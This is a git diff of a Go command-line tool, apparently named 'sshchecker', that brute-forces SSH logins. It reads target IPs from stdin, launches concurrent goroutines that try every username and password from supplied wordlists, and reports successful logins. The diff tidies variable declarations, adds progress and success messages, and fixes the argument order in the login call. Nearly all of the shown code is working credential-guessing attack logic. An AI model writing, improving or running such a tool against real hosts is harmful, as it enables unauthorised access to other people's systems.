@@ -16,7 +16,6 @@ const banner = `
   / ___/ ___/ __ \/ ___/ __ \/ _ \/ ___/ //_/ _ \/ ___/
  (__  |__  ) / / / /__/ / / /  __/ /__/ ,< /  __/ /    
 /____/____/_/ /_/\___/_/ /_/\___/\___/_/|_|\___/_/v1.0     
-                                                       
 `
 const Version = `1.0`
 
@@ -29,10 +28,13 @@ func showBanner() {
 }
 
 var (
-	userList     string
-	passwordList string
-	//concurrency  int
-	ShowVer bool
+	userList      string
+	passwordList  string
+	concurrency   int
+	ShowVer       bool
+	userlistSlice []string
+	passwordSlice []string
+	ipStatus      map[string]bool
 )
 
 func ParseOptions() {
@@ -44,10 +46,6 @@ func ParseOptions() {
 	flag.Parse()
 
 }
-
-var userlistSlice []string
-var passwordSlice []string
-var ipStatus map[string]bool
 
 func main() {
 	userlistSlice := make([]string, 0)
@@ -66,38 +64,31 @@ func main() {
 	//To read the flag passwordlist
 	passwordSlice = reader(passwordList)
 	ipStatus = make(map[string]bool)
-	//reading userlist from the flag input.
-	/*for i := range userlistSlice {
-		fmt.Println("User List", i)
-	}
-
-	for j := range passwordSlice {
-		fmt.Println("password List", j)
-	}*/
-	//Checking
 	//adding scanner for reading the input from terminal
 	sc := bufio.NewScanner(os.Stdin)
 
 	for sc.Scan() {
 		text := sc.Text()
+		fmt.Printf("Bruteforcing on %v\n", text)
 		for _, usr := range userlistSlice {
-			fmt.Println("Checking ip ", text, ipStatus[text])
 			if ipStatus[text] == true {
+				fmt.Printf("Success Login on \n%v", text)
 				break
 			} else {
 				go bruteforce(text, usr, passwordSlice)
+				fmt.Printf("Trying %v, %v, %v\n", text, usr, passwordSlice)
 			}
 		}
-		fmt.Println(text)
 
 	}
 }
 
 func bruteforce(ip, user string, pass []string) {
-	fmt.Println(pass)
+	//fmt.Println(pass)
 	//fmt.Printf("Trying sshing on: %v with user: %s\n", ip, user)
+
 	for _, pwd := range pass {
-		sshlogin(user, pwd, ip)
+		sshlogin(user, ip, pwd)
 	}
 }
 
@@ -131,10 +122,5 @@ func sshlogin(user, ip, pass string) {
 	if err == nil {
 		fmt.Println("ssh successful")
 		ipStatus[ip] = true
-	} else {
-		fmt.Println("ssh failed")
 	}
 }
-
-//[TODO] Take Username and password one by one..
-//[TODO] Now try that username and password
